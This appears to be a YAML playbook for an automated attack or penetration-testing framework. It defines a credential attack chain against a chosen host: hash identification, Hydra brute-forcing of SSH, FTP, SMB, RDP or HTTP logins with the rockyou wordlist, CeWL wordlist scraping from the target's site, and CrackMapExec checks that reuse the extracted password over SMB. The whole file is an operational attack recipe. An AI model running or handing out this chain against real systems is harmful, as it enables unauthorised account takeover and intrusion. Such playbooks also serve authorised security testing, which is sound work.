name: "Password & Hash Attack Chain"
description: "Identify hash types, brute-force credentials across services, crack offline, and verify access."
category: password
attack_vector: "Credential attacks — online brute + offline cracking"
variables:
  target:
    required: true
    description: "Target host"
  service:
    required: false
    default: "ssh"
    description: "Service to attack (ssh/ftp/smb/rdp/http)"
  username:
    required: true
    description: "Username or userlist"
  hash:
    required: false
    description: "Hash to identify and crack (for offline phase)"
  wordlist:
    required: false
    default: "/usr/share/wordlists/rockyou.txt"
    description: "Wordlist path"
cutting_edge: false
references: ["hashcat wiki", "Hydra usage", "MITRE ATT&CK T1110"]

steps:
  - name: "hash_identify"
    tool: "hashid_identify"
    description: "Identify the hash type"
    args:
      hash: "{{hash}}"
    expected_output: "MD5|SHA|bcrypt|NTLM|Kerberos|Unknown"
    timeout: 10
    gate: false
    retries: 1

  - name: "hydra_brute"
    tool: "hydra_brute"
    description: "Online brute-force attack against the service"
    args:
      target: "{{target}}"
      service: "{{service}}"
      username: "{{username}}"
      password_list: "{{wordlist}}"
      threads: 16
    expected_output: "login:|password:|\\[\\d+\\]\\[{{service}}\\] host"
    timeout: 600
    gate: false
    retries: 1
    extracts:
      - var: "found_password"
        regex: "login:\\s*(\\S+)\\s+password:\\s*(\\S+)"

  - name: "cewl_custom_wordlist"
    tool: "cewl_gen"
    description: "Generate target-specific wordlist from their website"
    args:
      url: "http://{{target}}"
      depth: 2
    expected_output: null
    timeout: 120
    gate: false
    retries: 1

  - name: "verify_access"
    tool: "crackmapexec_exec"
    description: "Verify cracked credentials across protocols"
    args:
      target: "{{target}}"
      protocol: "smb"
      username: "{{username}}"
      password: "{{found_password}}"
    expected_output: "\\[\\+\\]|Pwn3d"
    timeout: 300
    gate: false
    retries: 1
